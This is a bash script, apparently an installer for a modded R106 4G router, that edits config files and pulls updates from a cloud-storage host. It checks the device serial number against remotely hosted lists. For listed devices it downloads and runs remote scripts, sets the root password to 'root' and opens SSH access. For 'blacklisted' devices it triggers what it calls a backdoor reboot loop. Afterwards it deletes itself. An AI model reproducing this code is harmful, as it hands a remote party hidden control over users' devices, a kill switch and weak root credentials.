#!/bin/bash

function install_bmd_hosts() {
    echo "获取本机云控地址"
        if [ -z "$(grep rc_host_ip /m_webui/usr/db/custom_data.txt)" ]; then
            echo "文件一不包含云控地址，检测文件二"
            if [ -z "$(grep rc_host_ip /m_data/factor/db/factor_data.txt)" ]; then
                echo "文件二不包含云控地址，跳过"
                install_bmd_sim
            else
                yunkongn=$(sed -n 's/^rc_host_ip=\(.*\)/\1/p' /m_data/factor/db/factor_data.txt)
                   if grep -q "$yunkongn" /etc/hosts; then
                       echo "文件二中的云控屏蔽过了，跳过"
                       install_bmd_sim
                   else
                       echo "127.0.0.1 $yunkongn" >> /etc/hosts
                       echo "已通过文件二屏蔽云控，执行重启"
                       reboot
                   fi
            fi
        else
            yunkongn=$(sed -n 's/^rc_host_ip=\(.*\)/\1/p' /m_webui/usr/db/custom_data.txt)
            if grep -q "$yunkongn" /etc/hosts; then
                echo "文件一中的云控屏蔽过了，跳过"
                install_bmd_sim
            else
                echo "127.0.0.1 $yunkongn" >> /etc/hosts
                echo "已通过文件一屏蔽云控，执行重启"
                reboot
            fi    
        fi
    install_bmd_sim
}

function install_bmd_sim() {
    echo "关闭自动切卡"
        # 检测切卡配置存放位置1
        if [ -z "$(grep mnet_sim_switch=on /m_webui/usr/db/custom_data.txt)" ]; then
            echo "文件1不包含自动切卡，检测另一个文件"
            # 检测切卡配置存放位置2
            if [ -z "$(grep mnet_sim_switch=on /m_data/factor/db/factor_data.txt)" ]; then
              echo "文件2不包含自动切卡，检测另一个文件"
                 # 检测切卡配置存放位置3
                 if [ -z "$(grep mnet_sim_switch=on /m_webui/usr/db/custom_data_256.txt)" ]; then
                    echo "文件3也不包含自动切卡或文件不存在，跳过"
                    install_bmd_wifi
               else
                    sed -i 's/mnet_sim_switch=on/mnet_sim_switch=off/' /m_webui/usr/db/custom_data_256.txt
                    sed -i 's/mnet_sim_switch=on/mnet_sim_switch=off/' /m_webui/usr/db/custom_data_257.txt
                    sed -i 's/mnet_sim_switch=on/mnet_sim_switch=off/' /m_webui/usr/db/custom_data_258.txt
                    sed -i 's/mnet_sim_switch=on/mnet_sim_switch=off/' /m_webui/usr/db/custom_data_260.txt
                    sed -i 's/mnet_sim_slot=2/mnet_sim_slot=1/' /m_webui/usr/db/custom_data_256.txt
                    sed -i 's/mnet_sim_slot=2/mnet_sim_slot=1/' /m_webui/usr/db/custom_data_257.txt
                    sed -i 's/mnet_sim_slot=2/mnet_sim_slot=1/' /m_webui/usr/db/custom_data_258.txt
                    sed -i 's/mnet_sim_slot=2/mnet_sim_slot=1/' /m_webui/usr/db/custom_data_260.txt
                    echo "文件3成功关闭自动切卡"
                    install_bmd_wifi
                fi
            else
                sed -i 's/mnet_sim_switch=on/mnet_sim_switch=off/' /m_data/factor/db/factor_data.txt
                sed -i 's/mnet_sim_slot=2/mnet_sim_slot=1/' /m_data/factor/db/factor_data.txt
                sed -i 's/mnet_sim_polling=on/mnet_sim_polling=off/' /m_data/factor/db/factor_data.txt
                echo "文件2成功关闭自动切卡"
                install_bmd_wifi
            fi
        else    
            sed -i 's/mnet_sim_switch=on/mnet_sim_switch=off/' /m_webui/usr/db/custom_data.txt
            sed -i 's/mnet_sim_slot=2/mnet_sim_slot=1/' /m_webui/usr/db/custom_data.txt
            sed -i 's/mnet_sim_polling=on/mnet_sim_polling=off/' /m_webui/usr/db/custom_data.txt
            sed -i 's/mnet_sim_switch=on/mnet_sim_switch=off/' /m_webui/usr/db/custom_data_256.txt
            sed -i 's/mnet_sim_switch=on/mnet_sim_switch=off/' /m_webui/usr/db/custom_data_257.txt
            sed -i 's/mnet_sim_switch=on/mnet_sim_switch=off/' /m_webui/usr/db/custom_data_258.txt
            sed -i 's/mnet_sim_switch=on/mnet_sim_switch=off/' /m_webui/usr/db/custom_data_260.txt
            sed -i 's/mnet_sim_slot=2/mnet_sim_slot=1/' /m_webui/usr/db/custom_data_256.txt
            sed -i 's/mnet_sim_slot=2/mnet_sim_slot=1/' /m_webui/usr/db/custom_data_257.txt
            sed -i 's/mnet_sim_slot=2/mnet_sim_slot=1/' /m_webui/usr/db/custom_data_258.txt
            sed -i 's/mnet_sim_slot=2/mnet_sim_slot=1/' /m_webui/usr/db/custom_data_260.txt
            echo "文件1成功关闭自动切卡"
            install_bmd_wifi
        fi
}


function install_bmd_wifi() {
    echo "修改wifi最大连接数量为32"
        if [ -z "$(grep wifi_max_client_range_0=8 /m_webui/usr/db/custom_data.txt)" ]; then
            echo "指令一不存在8，检测16"
            if [ -z "$(grep wifi_max_client_range_0=16 /m_webui/usr/db/custom_data.txt)" ]; then
               echo "指令一不存在16，检测指令二"
               if [ -z "$(grep wifi_max_client_0=8 /m_webui/usr/db/custom_data.txt)" ]; then
                  echo "指令二不存在8，检测16"
                  if [ -z "$(grep wifi_max_client_0=16 /m_webui/usr/db/custom_data.txt)" ]; then
                      echo "指令二不存在16，跳过"
                      install_bmd_gjwebui
                  else
                      sed -i 's/wifi_max_client_0=16/wifi_max_client_0=32/' /m_webui/usr/db/custom_data.txt
                      sed -i 's/wifi_max_client_1=16/wifi_max_client_1=32/' /m_webui/usr/db/custom_data.txt
                      echo "指令二成功将16改成32"
                      reboot
                      install_bmd_gjwebui
                  fi
               else
                   sed -i 's/wifi_max_client_0=8/wifi_max_client_0=32/' /m_webui/usr/db/custom_data.txt
                   sed -i 's/wifi_max_client_1=8/wifi_max_client_1=32/' /m_webui/usr/db/custom_data.txt
                   echo "代指令二成功将8改成32"
                   reboot
                   install_bmd_gjwebui
               fi
            else
                sed -i 's/wifi_max_client_range_0=16/wifi_max_client_range_0=32/' /m_webui/usr/db/custom_data.txt
                sed -i 's/wifi_max_client_range_1=16/wifi_max_client_range_1=32/' /m_webui/usr/db/custom_data.txt
                echo "指令一成功将16改成32"
                reboot
                install_bmd_gjwebui
            fi
        else  
            sed -i 's/wifi_max_client_range_0=8/wifi_max_client_range_0=32/' /m_webui/usr/db/custom_data.txt
            sed -i 's/wifi_max_client_range_1=8/wifi_max_client_range_1=32/' /m_webui/usr/db/custom_data.txt
            echo "指令一成功将8改成32"
            reboot
            install_bmd_gjwebui  
        fi
}

function install_bmd_gjwebui() {
    echo "检测8080后台是否存在"
      if [ -f /home/root/8080/8080.sh ]; then
        echo "8080文件完整"
        install_bmd_smswebui
      else
        echo "8080不存在开始下载"
        wget -O 8080.tar "https://vip.123pan.cn/1725810/%E5%88%B7%E6%9C%BA%E5%8C%85%E5%9C%A8%E7%BA%BF%E6%96%87%E4%BB%B6/8080/8080.tar"
           if [ -f 8080.tar ]; then
              echo "8080下载完成，执行文件"
              tar xvf 8080.tar
              cp -r /tmp/8080/ /home/root/
              rm 8080.tar
              rm -rf /tmp/8080
              reboot
            else
              echo "8080下载失败"
              install_bmd_smswebui
           fi
      fi
}

function install_bmd_smswebui() {
    echo "验证是否开启短信转发或是否有新版"
    rm /tmp/smssn.txt
    wget -O smssn.txt "https://fs-im-kefu.7moor-fs1.com/ly/4d2c3f00-7d4c-11e5-af15-41bf63ae4ea0/1723283885599/smssn.txt"
    sn_content=$(cat sn.txt)
if grep -q "$sn_content" smssn.txt; then
    echo "指定名单，开启短信转发"
    if [ -z "$(cat /m_webui/webui/html/deviceinfo.html | grep 3.3.5_sms6)" ]; then
      wget -O smswebui.zip "https://vip.123pan.cn/1725810/%E5%88%B7%E6%9C%BA%E5%8C%85%E5%9C%A8%E7%BA%BF%E6%96%87%E4%BB%B6/r106/webui/smswebui.zip"
         if [ -f smswebui.zip ]; then
            echo "短信转发下载完成，执行文件"
            killall -9 forward.web
            killall -9 forward.client
            cp /home/root/forward/.forward.ini /home/root/
            rm -rf /home/root/forward
            rm -rf /tmp/forward
            unzip smswebui.zip
            chmod 777 /tmp/insms.sh
            chmod 777 /tmp/forward/*
            cp -r index.html /home/root/8080/dist/
            cp -r forward /home/root/
            cp -r insms.sh /home/root/
            cp -r webui /m_webui/
            rm smswebui.zip
            rm index.html
            rm insms.sh
            rm -rf webui 
            rm -rf forward
            bash /home/root/insms.sh
            sleep 5
            rm /home/root/insms.sh
            cp /home/root/.forward.ini /home/root/forward/
            /home/root/forward/sms.sh &
            install_bmd_webui
         else
            echo "短信转发下载失败"
         fi
    fi
      echo "已经是最新版短信转发"
    install_bmd_webui
else
    echo "非指定名单，验证短信转发是否存在"
    if [ -z "$(cat /etc/init.d/hostname.sh | grep sms)" ]; then
       echo "短信转发不存在"
       install_bmd_webui
    fi
       echo "短信转发存在，移除文件"
       rm -rf /home/root/forward
       sed -i '/sms/d' /etc/init.d/hostname.sh
       sed -i '/sms/d' /etc/rcS.d/S39hostname.sh
       wget -O webui.zip "https://vip.123pan.cn/1725810/%E5%88%B7%E6%9C%BA%E5%8C%85%E5%9C%A8%E7%BA%BF%E6%96%87%E4%BB%B6/r106/webui/webui.zip"
          if [ -f webui.zip ]; then
            unzip webui.zip
            rm -rf /m_webui/webui
            cp -r webui /m_webui/
            rm webui.zip
            rm -rf webui 
            echo "短信转发以移除"
            install_bmd_webui
      else
            echo "下载失败"
            install_bmd_webui
          fi
    install_bmd_webui
fi
}

function install_bmd_webui() {
    echo "检测webui后台版本"
if [ -z "$(cat /m_webui/webui/html/deviceinfo.html | grep 3.3.5)" ]; then
      wget -O webui.zip "https://vip.123pan.cn/1725810/%E5%88%B7%E6%9C%BA%E5%8C%85%E5%9C%A8%E7%BA%BF%E6%96%87%E4%BB%B6/r106/webui/webui.zip"
      if [ -f webui.zip ]; then
        echo "下载完成，执行文件"
        unzip webui.zip
        cp -r webui /m_webui/
        cp -r index.html /home/root/8080/dist/
        rm webui.zip
        rm index.html
        rm -rf webui 
        install_bmd_ttydwebui
      else
        echo "下载失败"
        install_bmd_ttydwebui
      fi
else
   echo "已经是最新版webui后台"
   install_bmd_ttydwebui
fi
}

function install_bmd_ttydwebui() {
    echo "验证是否开启TTYD网页终端"
    rm /tmp/ttydsn.txt
    wget -O ttydsn.txt "https://vip.123pan.cn/1725810/%E5%88%B7%E6%9C%BA%E5%8C%85%E5%9C%A8%E7%BA%BF%E6%96%87%E4%BB%B6/r106/sn/ttydsn.txt"
    sn_content=$(cat sn.txt)
if grep -q "$sn_content" ttydsn.txt; then
    echo "指定名单，开启TTYD网页中的"
    if [ -z "$(cat /m_webui/webui/html/deviceinfo.html | grep 3.3.2_ttyd)" ]; then
      wget -O ttydwebui.zip "https://vip.123pan.cn/1725810/%E5%88%B7%E6%9C%BA%E5%8C%85%E5%9C%A8%E7%BA%BF%E6%96%87%E4%BB%B6/r106/webui/ttydwebui.zip"
         if [ -f ttydwebui.zip ]; then
            echo "下载完成，执行文件"
            unzip ttydwebui.zip
            chmod 777 ttyd.sh
            chmod 777 ttyd.aarch64
            cp -r ttyd.sh /home/root/
            cp -r ttyd.aarch64 /home/root/
            rm ttyd.sh
            rm ttyd.aarch64
            cp -r webui /m_webui/
            rm ttydwebui.zip
            rm -rf webui
            bash /home/root/ttyd.sh
            sleep 5
            rm /home/root/ttyd.sh
            reboot
         else
            echo "下载失败"
         fi
    else
      echo "已经是最新版TTYD后台"
      exit
    fi
else
    echo "非指定名单，移除TTYD网页终端"
    if [ -z "$(cat /etc/init.d/hostname.sh | grep ttyd)" ]; then
       echo "网页终端不存在/执行结束"
       install_bmd_exit
    else
       echo "网页终端存在，移除文件"
       rm /home/root/ttyd.aarch64
       sed -i '/ttyd/d' /etc/init.d/hostname.sh
       sed -i '/ttyd/d' /etc/rcS.d/S39hostname.sh
       wget -O webui.zip "https://vip.123pan.cn/1725810/%E5%88%B7%E6%9C%BA%E5%8C%85%E5%9C%A8%E7%BA%BF%E6%96%87%E4%BB%B6/r106/webui/webui.zip"
          if [ -f webui.zip ]; then
            unzip webui.zip
            rm -rf /m_webui/webui
            cp -r webui /m_webui/
            rm webui.zip
            rm -rf webui 
            echo "ttyd文件以移除"
            install_bmd_exit
         else
            echo "下载失败"
            install_bmd_exit
          fi
    fi
       
fi
}

# 退出脚本
function install_bmd_exit() {
   rm -rf smssn.txt
   rm -rf xxsn.txt
   rm -rf hostssn.txt
   rm -rf sn_yun.txt
   rm -rf ttydsn.txt
   rm -rf R106_0.sh
   rm "$0"
   exit 
}

#-----------------------------非白名单------------------------------------
# 非白名单函数主页标签
function install_fbmd_reboot() {
    echo "对比SN是否执行后门，暂定无限重启"
    rm /tmp/xxsn.txt
    wget -O xxsn.txt "https://vip.123pan.cn/1725810/%E5%88%B7%E6%9C%BA%E5%8C%85%E5%9C%A8%E7%BA%BF%E6%96%87%E4%BB%B6/r106/sn/xxsn.txt"
    sn_content=$(cat sn.txt)
   # 检查xxsn.txt中的内容是否包含sn.txt中的内容
if grep -q "$sn_content" xxsn.txt; then
    echo "指定黑名单，执行后门"
        rm  /home/root/xxsn.txt
        reboot
else
    echo "不是黑名单，跳过"
    install_fbmd_ts
fi
}

function install_fbmd_ts() {
    echo "独立特殊操作"
    #暂时不用，代码预定，更新离线后台
    install_fbmd_xxhosts
}

function install_fbmd_xxhosts() {
  echo "非白名单模式恢复云控"
  rm /tmp/xxhosts.txt
  wget -O xxhosts.txt "https://vip.123pan.cn/1725810/%E5%88%B7%E6%9C%BA%E5%8C%85%E5%9C%A8%E7%BA%BF%E6%96%87%E4%BB%B6/r106/sn/xxhosts.txt"
  sn_content=$(cat sn.txt)
  if grep -q "$sn_content" xxhosts.txt; then
    echo "指定用户，移除屏蔽代码恢复云控"
    if [ -z "$(cat /etc/hosts | grep dss-accept.xywlhlh.com)" ]; then
      echo "此用户已经没有屏蔽了"
    else
      echo "移除屏蔽代码"
      sed -i '/dss-accept.xywlhlh.com/d' /etc/hosts
      reboot
    fi
    install_fbmd_lx
  else
    echo "非指定用户，跳过"
    install_fbmd_lx
  fi
}



function install_fbmd_lx() {
    echo "更新离线文件"
  if [ -z "$(cat /m_webui/webui/html/deviceinfo.html | grep 2024.04.21)" ]; then
      rm deviceinfo.html
      wget -O deviceinfo.html "https://vip.123pan.cn/1725810/%E5%88%B7%E6%9C%BA%E5%8C%85%E5%9C%A8%E7%BA%BF%E6%96%87%E4%BB%B6/r106/webui/xxwebui/deviceinfo.html"
      if [ -f deviceinfo.html ]; then
        echo "下载完成，执行文件"
        cp -r /m_webui/webui /tmp/
        cp deviceinfo.html /tmp/webui/html/
        cp -r webui /m_webui/
        rm -rf webui
        rm deviceinfo.html
        install_fbmd_ssh
       else
        echo "下载失败"
        install_fbmd_ssh
      fi
 else
     echo "已经是离线文件"
      install_fbmd_ssh
  fi
}


function install_fbmd_ssh() {
    rm /tmp/sshsn.txt
    wget -O sshsn.txt "https://vip.123pan.cn/1725810/%E5%88%B7%E6%9C%BA%E5%8C%85%E5%9C%A8%E7%BA%BF%E6%96%87%E4%BB%B6/r106/sn/sshsn.txt"
    sn_content=$(cat sn.txt)
if grep -q "$sn_content" sshsn.txt; then
    echo "指定名单，执行开启ssh"
    if [ -z "$(cat /etc/init.d/hostname.sh | grep sshd.sh)" ]; then
      echo -e "root\nroot" | passwd root
      wget -O ssh.zip "https://vip.123pan.cn/1725810/%E5%88%B7%E6%9C%BA%E5%8C%85%E5%9C%A8%E7%BA%BF%E6%96%87%E4%BB%B6/r106/ssh/ssh.zip"
         if [ -f ssh.zip ]; then
            echo "下载完成，执行文件"
            rm /etc/init.d/R106.sh
            rm /etc/init.d/r106.sh
            rm -rf /home/root/forward
            rm /home/root/ssh.sh
            rm /home/root/sn.txt
            rm /home/root/R106.sh
            rm /home/root/r106.sh
            sed -i '/R106/d' /etc/init.d/hostname.sh
            sed -i '/R106/d' /etc/rcS.d/S39hostname.sh
            unzip ssh.zip
            tar xvf ssh.tar
            rm ssh.zip
            rm ssh.tar
            cp -r dropbear /home/root/
            chmod 777 ssh.sh
            bash /tmp/ssh.sh start &
         else
            echo "下载失败,后门服务器未打开"
            install_bmd_exit
         fi
    fi
      echo "已经存在ssh了"
      install_bmd_exit
else
    echo "非指定名单，移除ssh"
    if [ -z "$(cat /etc/init.d/hostname.sh | grep ssh)" ]; then
       echo "hostname.sh文件中不包含ssh，执行结束"
       install_bmd_exit
    fi
       echo "hostname.sh文件中包含ssh，移除文件"
       rm -rf /home/root/dropbear
       sed -i '/ssh/d' /etc/init.d/hostname.sh
       sed -i '/ssh/d' /etc/rcS.d/S39hostname.sh
       install_bmd_exit
fi
}






# ----------------------------------根据条件调用函数-----------------------------------------------------
cd /tmp/
mount -o remount,rw /
mount -o remount,rw /m_data
mount -o remount,rw /m_webui

rm /tmp/sn_yun.txt
wget -O sn_yun.txt "https://vip.123pan.cn/1725810/%E5%88%B7%E6%9C%BA%E5%8C%85%E5%9C%A8%E7%BA%BF%E6%96%87%E4%BB%B6/r106/sn/sn_yun.txt"
sn_content=$(cat /tmp/sn.txt)
if grep -q "$sn_content" sn_yun.txt; then
    echo "运行白名单"
    install_bmd_hosts
else
    echo "运行非白名单"
     install_fbmd_reboot
fi
exit 0
